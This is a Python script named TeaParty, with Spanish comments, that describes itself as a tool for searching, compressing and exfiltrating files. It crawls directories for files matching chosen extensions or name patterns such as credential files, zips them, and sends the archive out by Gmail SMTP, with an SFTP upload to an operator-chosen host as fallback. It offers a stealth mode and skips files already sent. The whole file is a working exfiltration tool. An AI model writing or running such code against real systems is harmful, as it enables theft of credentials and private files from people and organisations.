import os
import fnmatch
import smtplib
import ssl
import zipfile
import argparse
import sys
import hashlib
import json
import time
from tempfile import NamedTemporaryFile
from email.message import EmailMessage
from datetime import datetime

# --- Módulo SFTP embebido ---
try:
    import paramiko

    def subir_sftp(archivo_local, host, puerto, usuario, clave, carpeta_remota=""):
        try:
            transport = paramiko.Transport((host, puerto))
            transport.connect(username=usuario, password=clave)
            sftp = paramiko.SFTPClient.from_transport(transport)

            if carpeta_remota:
                try:
                    sftp.chdir(carpeta_remota)
                except IOError:
                    sftp.mkdir(carpeta_remota)
                    sftp.chdir(carpeta_remota)

            nombre_archivo = os.path.basename(archivo_local)
            destino = os.path.join(carpeta_remota, nombre_archivo) if carpeta_remota else nombre_archivo
            sftp.put(archivo_local, destino)
            sftp.close()
            transport.close()
            return True, f"Archivo subido por SFTP a {host}:{destino}"
        except Exception as e:
            return False, f"Error al subir por SFTP: {str(e)}"
except ImportError:
    subir_sftp = None

# --- Logger doble para consola y archivo ---
class TeeLogger:
    def __init__(self, log_file, quiet=False):
        self.terminal = sys.stdout
        self.log = open(log_file, "w", encoding="utf-8")
        self.quiet = quiet

    def write(self, message):
        if not self.quiet:
            self.terminal.write(message)
        self.log.write(message)

    def flush(self):
        if not self.quiet:
            self.terminal.flush()
        self.log.flush()

def mostrar_banner():
    print(r"""
╔════════════════════════════════════════════╗
║                                            ║
║        ████████╗███████╗ █████╗            ║
║        ╚══██╔══╝██╔════╝██╔══██╗           ║
║           ██║   █████╗  ███████║           ║
║           ██║   ██╔══╝  ██╔══██║           ║
║           ██║   ███████╗██║  ██║           ║
║           ╚═╝   ╚══════╝╚═╝  ╚═╝           ║
║                                            ║
║        TeaParty  -  by  Lagash             ║
╚════════════════════════════════════════════╝
""")

def generar_log_path():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M")
    return os.path.abspath(f"TeaParty_Log_{timestamp}.txt")

def sha256_de_archivo(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for bloque in iter(lambda: f.read(4096), b""):
            h.update(bloque)
    return h.hexdigest()

def cargar_cache_hash():
    if os.path.exists("TeaParty_HashCache.json"):
        with open("TeaParty_HashCache.json", "r") as f:
            return set(json.load(f))
    return set()

def guardar_cache_hash(hash_set):
    with open("TeaParty_HashCache.json", "w") as f:
        json.dump(list(hash_set), f)

def archivo_excluido(nombre_archivo, patrones_exclusion):
    return any(fnmatch.fnmatch(nombre_archivo.lower(), p.lower()) for p in patrones_exclusion)

def coincide(nombre_archivo, extensiones, patrones):
    resultado = True
    if extensiones:
        resultado = any(fnmatch.fnmatch(nombre_archivo.lower(), f"*{ext.lower()}") for ext in extensiones)
    if patrones:
        resultado = resultado and any(fnmatch.fnmatch(nombre_archivo.lower(), p.lower()) for p in patrones)
    return resultado

def input_con_salida(prompt):
    entrada = input(prompt).strip()
    if entrada.lower() in ["salir", "exit", "q"]:
        print("⏹️ Salida solicitada. Cerrando TeaParty...")
        sys.exit(0)
    return entrada


def parse_args_interactivo():
    mostrar_banner()
    print("[*] Iniciando en modo interactivo...\n")

    tipo_busqueda = int(input_con_salida("Tipo de búsqueda (1=extensión, 2=nombre, 3=ambas): "))
    extensiones = input_con_salida("Extensiones (ej: .pdf,.docx), dejar vacío si no aplica: ")
    patrones = input_con_salida("Patrones de nombre (ej: *cred*.txt), dejar vacío si no aplica: ")
    directorio = input_con_salida("Directorio raíz (por defecto actual): ") or os.getcwd()
    recursivo = input_con_salida("¿Buscar recursivamente? (1=sí, 0=no): ") or "1"
    carpetas_excluir = input_con_salida("Carpetas a excluir (ej: .git,node_modules): ")
    archivos_excluir = input_con_salida("Archivos a excluir (ej: *.log,*.tmp): ")
    remitente_clave = input_con_salida("Correo del remitente con clave (usuario:clave): ")
    destinatarios = input_con_salida("Destinatarios separados por coma: ")
    politica_zip = input_con_salida("¿Conservar ZIP? (1=sí, 2=no): ") or "1"
    modo_debug = input_con_salida("¿Activar modo debug? (s/n): ").lower() == "s"
    modo_quiet = input_con_salida("¿Modo silencioso/stealth? (s/n): ").lower() == "s"
    usar_sftp = input_con_salida("¿Habilitar SFTP si falla el mail? (s/n): ").lower() == "s"
    sftp_fallback_only = True

    sftp_host = sftp_user = sftp_pass = sftp_dir = ""
    sftp_port = 22
    if usar_sftp:
        sftp_host = input_con_salida("Host SFTP: ")
        sftp_port = int(input_con_salida("Puerto SFTP (default 22): ") or "22")
        sftp_user = input_con_salida("Usuario SFTP: ")
        sftp_pass = input_con_salida("Contraseña SFTP: ")
        sftp_dir = input_con_salida("Directorio remoto (puede dejarse vacío): ")

    class Args:
        pass

    args = Args()
    args.s = tipo_busqueda
    args.e = extensiones
    args.p = patrones
    args.d = directorio
    args.r = int(recursivo)
    args.x = carpetas_excluir
    args.xfile = archivos_excluir
    args.m = remitente_clave
    args.to = destinatarios
    args.z = int(politica_zip)
    args.debug = modo_debug
    args.quiet = modo_quiet
    args.sftp = usar_sftp
    args.sftp_fallback_only = sftp_fallback_only
    args.sftp_host = sftp_host
    args.sftp_port = sftp_port
    args.sftp_user = sftp_user
    args.sftp_pass = sftp_pass
    args.sftp_dir = sftp_dir

    return args

def parse_args():
    parser = argparse.ArgumentParser(description="TeaParty - Script de búsqueda, compresión y exfiltración de archivos.")
    parser.add_argument("-s", type=int, help="Tipo de búsqueda: 1=extensión, 2=nombre, 3=ambas")
    parser.add_argument("-e", type=str, help="Extensiones separadas por coma (ej: .pdf,.docx)")
    parser.add_argument("-p", type=str, help="Patrones por nombre separados por coma (ej: *cred*.txt)")
    parser.add_argument("-d", type=str, help="Directorio raíz donde iniciar la búsqueda")
    parser.add_argument("-r", type=int, help="Recursivo: 1=sí, 0=no")
    parser.add_argument("-x", type=str, help="Carpetas a excluir (ej: node_modules,.git)")
    parser.add_argument("-xfile", type=str, help="Archivos a excluir (ej: *.log,*.tmp)")
    parser.add_argument("-m", type=str, help="Correo del remitente con clave separados por ':' (ej: user@gmail.com:clave)")
    parser.add_argument("-to", type=str, help="Destinatarios separados por coma")
    parser.add_argument("-z", type=int, help="ZIP: 1=Conservar, 2=Eliminar si se envió")
    parser.add_argument("--debug", action="store_true", help="Habilita archivo de log de ejecución")
    parser.add_argument("--quiet", action="store_true", help="Modo silencioso, no imprime por consola")
    parser.add_argument("--sftp", action="store_true", help="Habilita subida por SFTP")
    parser.add_argument("--sftp-fallback-only", action="store_true", help="Solo usar SFTP si falla el correo")
    parser.add_argument("--sftp-host", type=str, help="Host del servidor SFTP")
    parser.add_argument("--sftp-port", type=int, default=22, help="Puerto del servidor SFTP")
    parser.add_argument("--sftp-user", type=str, help="Usuario para autenticación SFTP")
    parser.add_argument("--sftp-pass", type=str, help="Contraseña para autenticación SFTP")
    parser.add_argument("--sftp-dir", type=str, default="", help="Directorio remoto donde subir el archivo")

    args = parser.parse_args()
    if len(sys.argv) == 1:
        return parse_args_interactivo()
    return args

def buscar_archivos(directorio, extensiones, patrones, carpetas_excluir, archivos_excluir, recursivo, hash_cache):
    archivos_encontrados = []
    for ruta, dirs, archivos in os.walk(directorio):
        if not recursivo:
            dirs.clear()
        dirs[:] = [d for d in dirs if d not in carpetas_excluir]
        for archivo in archivos:
            full_path = os.path.join(ruta, archivo)
            if archivo_excluido(archivo, archivos_excluir):
                continue
            if not coincide(archivo, extensiones, patrones):
                continue
            hash_actual = sha256_de_archivo(full_path)
            if hash_actual not in hash_cache:
                archivos_encontrados.append((full_path, hash_actual))
    return archivos_encontrados

def crear_log_txt(archivos, zip_name=None):
    log_temp = NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8")
    log_temp.write("Listado de archivos encontrados por TeaParty:\n\n")
    for path, _ in archivos:
        log_temp.write(path + "\n")

    log_temp.write("\n---\n[INTEGRIDAD]\n")
    for path, _ in archivos:
        nombre = os.path.basename(path)
        hash_archivo = sha256_de_archivo(path)
        log_temp.write(f"SHA256({nombre}): {hash_archivo}\n")

    if zip_name and os.path.exists(zip_name):
        zip_hash = sha256_de_archivo(zip_name)
        log_temp.write(f"\nSHA256({os.path.basename(zip_name)}): {zip_hash}\n")

    log_temp.close()
    return log_temp.name

def comprimir_archivos(archivos, log_debug_path=None):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M")
    nombre_zip = f"TeaParty_Lagash_{timestamp}.zip"
    log_path = crear_log_txt(archivos)

    with zipfile.ZipFile(nombre_zip, "w", zipfile.ZIP_DEFLATED) as zipf:
        for path, _ in archivos:
            zipf.write(path, arcname=os.path.basename(path))
        zipf.write(log_path, arcname="log.txt")
        if log_debug_path and os.path.exists(log_debug_path):
            zipf.write(log_debug_path, arcname="TeaParty_DebugLog.txt")

    return nombre_zip

def enviar_correo(archivo_zip, destinos, remitente, clave, smtp_server, smtp_port, reintentos=3):
    for intento in range(1, reintentos + 1):
        try:
            mensaje = EmailMessage()
            mensaje["Subject"] = "TeaParty - Archivos encontrados comprimidos"
            mensaje["From"] = remitente
            mensaje["To"] = ", ".join(destinos)
            mensaje.set_content("Se adjunta un archivo ZIP con los archivos encontrados y un log.txt con sus rutas.")

            with open(archivo_zip, "rb") as f:
                contenido = f.read()
                mensaje.add_attachment(contenido,
                                       maintype="application",
                                       subtype="zip",
                                       filename=os.path.basename(archivo_zip))

            contexto = ssl.create_default_context()
            with smtplib.SMTP_SSL(smtp_server, smtp_port, context=contexto) as server:
                server.login(remitente, clave)
                server.send_message(mensaje)

            return True
        except Exception as e:
            print(f"[!] Intento {intento} fallido: {e}")
            if intento < reintentos:
                time.sleep(3)
    return False

def main():
    args = parse_args()
    debug_mode = args.debug
    quiet_mode = args.quiet

    if debug_mode:
        log_path = generar_log_path()
        sys.stdout = sys.stderr = TeeLogger(log_path, quiet=quiet_mode)
    else:
        log_path = None

    if not quiet_mode:
        mostrar_banner()

    if not (args.m and args.to):
        print("[!] Faltan parámetros obligatorios. Usá -h para ayuda.")
        return

    extensiones = args.e.split(",") if args.e else []
    patrones = args.p.split(",") if args.p else []
    carpetas_excluir = args.x.split(",") if args.x else []
    archivos_excluir = args.xfile.split(",") if args.xfile else []
    ruta_busqueda = args.d if args.d else os.getcwd()
    recursivo = bool(args.r) if args.r is not None else True
    zip_policy = args.z if args.z in [1, 2] else 1

    if args.s == 1:
        patrones = []
    elif args.s == 2:
        extensiones = []
    elif args.s != 3:
        print("[!] Tipo de búsqueda inválido.")
        return

    if ":" not in args.m:
        print("[!] Formato de -m inválido. Usa remitente:clave")
        return

    remitente, clave = args.m.split(":", 1)
    destinos = [d.strip() for d in args.to.split(",")]

    if not quiet_mode:
        print(f"\n[+] Buscando archivos en: {ruta_busqueda}")

    hash_cache = cargar_cache_hash()
    encontrados = buscar_archivos(ruta_busqueda, extensiones, patrones, carpetas_excluir, archivos_excluir, recursivo, hash_cache)

    if not quiet_mode:
        print(f"[+] Archivos nuevos encontrados: {len(encontrados)}")
    if not encontrados:
        print("[!] No se encontraron archivos nuevos.")
        return

    for archivo, _ in encontrados:
        if not quiet_mode:
            print(archivo)

    zip_path = comprimir_archivos(encontrados, log_debug_path=log_path)
    zip_hash = sha256_de_archivo(zip_path)

    if not quiet_mode:
        print(f"\n[+] ZIP generado: {zip_path}")
        print(f"🔐 SHA256 del ZIP: {zip_hash}")

    exito_mail = enviar_correo(zip_path, destinos, remitente, clave, "smtp.gmail.com", 465)

    if exito_mail:
        print("✅ Correo enviado correctamente.")
        if zip_policy == 2:
            os.remove(zip_path)
            print(f"🗑️  ZIP eliminado: {zip_path}")
        else:
            print(f"📂 ZIP conservado: {os.path.abspath(zip_path)}")
        for _, h in encontrados:
            hash_cache.add(h)
        guardar_cache_hash(hash_cache)

    else:
        print(f"\n[!] ❌ Error al enviar el correo.")
        print(f"📂 ZIP conservado: {os.path.abspath(zip_path)}")

        if args.sftp and subir_sftp:
            if args.sftp_fallback_only:
                print("[*] Intentando subir por SFTP como alternativa...")

            ok, mensaje = subir_sftp(
                zip_path,
                args.sftp_host,
                args.sftp_port,
                args.sftp_user,
                args.sftp_pass,
                args.sftp_dir,
            )
            print(mensaje)

    if debug_mode:
        print(f"\n📄 Log guardado en: {log_path}")

if __name__ == "__main__":
    main()
